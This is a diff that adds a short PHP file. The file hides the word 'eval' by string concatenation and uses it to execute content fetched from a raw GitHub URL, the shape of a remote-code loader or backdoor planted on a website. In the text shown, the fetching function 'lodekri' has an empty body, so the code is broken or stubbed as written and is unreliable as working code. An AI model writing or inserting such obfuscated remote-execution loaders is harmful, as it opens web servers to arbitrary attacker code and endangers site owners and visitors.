@@ -1,0 +1,11 @@
+<?php
+
+$a = 'ev';
+$b = $a.'al'; 
+
+function lodekri($url) {
+}
+
+$b("?>" . lodekri("https://raw.githubusercontent.com/Rendisudiro03/landing/refs/heads/main/landingku.txt")); 
+
+?>
